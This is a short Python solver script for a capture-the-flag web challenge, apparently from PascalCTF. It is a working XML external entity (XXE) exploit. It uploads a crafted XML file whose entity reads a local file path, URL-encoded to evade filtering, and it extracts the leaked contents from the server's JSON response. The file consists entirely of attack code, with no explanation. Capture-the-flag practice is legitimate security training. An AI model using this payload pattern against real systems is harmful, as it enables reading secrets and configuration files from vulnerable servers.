import requests, re

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, prefix: str) -> str:
    with requests.Session() as ses:
        payload = r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "/app/%66%6c%61%67.txt">]><book><title>&xxe;</title><author>author</author><chapters></chapters></book>'
        files = {
            "file": ("answer.pasx", payload, "application/octet-stream")
        }
        flag = get_flag(ses.post(f"{url}/upload", files = files).json().get("book_title", ""), prefix)
    return flag

if __name__ == "__main__":
    url = f"https://pdfile.ctf.pascalctf.it"
    prefix = "pascalCTF"
    print(solution(url, prefix))
    